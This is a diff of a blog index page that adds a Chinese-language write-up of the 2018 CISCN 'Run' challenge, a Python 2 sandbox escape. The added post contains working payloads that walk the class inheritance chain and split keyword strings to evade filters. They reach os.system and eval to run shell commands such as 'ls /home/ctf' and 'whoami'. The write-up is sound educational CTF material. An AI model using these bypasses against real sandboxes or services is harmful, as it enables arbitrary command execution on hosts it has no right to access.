@@ -152,59 +152,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/06/test/">asdssad</a>
-    </h1>
-  
-
-        
-        <a href="/2018/05/06/test/" class="archive-article-date">
-  	<time datetime="2018-05-06T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-06</time>
-</a>
-        
-      </header>
-    
-
-
-    		
-
-
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/redhat/163264.jpg" alt=""></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/05/06/test/">read more.. >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
     <article id="post-Redhat_wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -259,6 +206,87 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/05/01/Redhat_wp/">read more.. >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
+    <article id="post-ciscn2018" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/30/ciscn2018/">国赛2018_Run_python继承链bypass</a>
+    </h1>
+  
+
+        
+        <a href="/2018/04/30/ciscn2018/" class="archive-article-date">
+  	<time datetime="2018-04-30T07:17:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-30</time>
+</a>
+        
+      </header>
+    
+
+
+    		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="python继承链基础"><a href="#python继承链基础" class="headerlink" title="python继承链基础"></a>python继承链基础</h2><ul>
+<li><code>__class__</code> 返回一个实例所属的类</li>
+<li><code>__base__</code>、<code>__bases__</code> 返回一个类所直接继承的类</li>
+<li><code>__subclasses</code> 获取一个类的子类list</li>
+<li><code>__builtins__</code> 内置模块，包含了<code>list</code>、<code>print</code>等函数</li>
+<li><code>__getattribute__()</code> 通过传入字符串来进行方法的调用</li>
+<li><code>__globals__</code> 返回一个当前空间下能使用的模块，方法和变量的字典。<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"><span class="keyword">print</span> test.f    <span class="comment"># &lt;unbound method test.f&gt;</span></div><div class="line"></div><div class="line"><span class="comment"># while in python3 will print...</span></div><div class="line"><span class="comment"># &lt;function test.f at 0x000001DB75310048&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> test.f.__globals__</div><div class="line"><span class="string">'''</span></div><div class="line">&#123;'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__name__': '__main__', 'test': &lt;class __main__.test at 0xb72544ac&gt;, '__doc__': None, '__package__': None&#125;</div><div class="line">'''</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><p>一道python2环境的沙箱逃逸。过滤了好多东西，<code>os</code>、<code>ls</code>、<code>system</code>等。。<br>我们可通过python的继承，来找到可用的<code>os</code>模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></div><div class="line">search = <span class="string">'os'</span></div><div class="line">num = <span class="number">-1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__.__subclasses__():</div><div class="line">    num += <span class="number">1</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</div><div class="line">            print(i, num)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span> </div><div class="line"></div><div class="line"><span class="comment"># (&lt;class 'site._Printer'&gt;, 71)</span></div><div class="line"><span class="comment"># (&lt;class 'site.Quitter'&gt;, 76)</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># payload</span></div><div class="line">s = ().__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>].__getattribute__(<span class="string">'s'</span>+<span class="string">'ystem'</span>)</div><div class="line"><span class="comment"># 拿到了os.system函数，可执行任意命令</span></div><div class="line">s(<span class="string">'l'</span>+<span class="string">'s /home/ctf'</span>)</div></pre></td></tr></table></figure>
+<h2 id="py2和py3利用-builtins"><a href="#py2和py3利用-builtins" class="headerlink" title="py2和py3利用__builtins__"></a>py2和py3利用<code>__builtins__</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__builtins__.__getattribute__(<span class="string">'ev'</span>+<span class="string">'al'</span>)(<span class="string">'__import__("os").system("whoami")'</span>)</div></pre></td></tr></table></figure>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>他已经讲得很清楚了-&gt;<a href="https://xz.aliyun.com/t/2308" target="_blank" rel="external">用python继承链搞事情</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/30/ciscn2018/">read more.. >></a>
         </p>
       
 
@@ -993,6 +1021,10 @@ return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){v
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">nothing</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
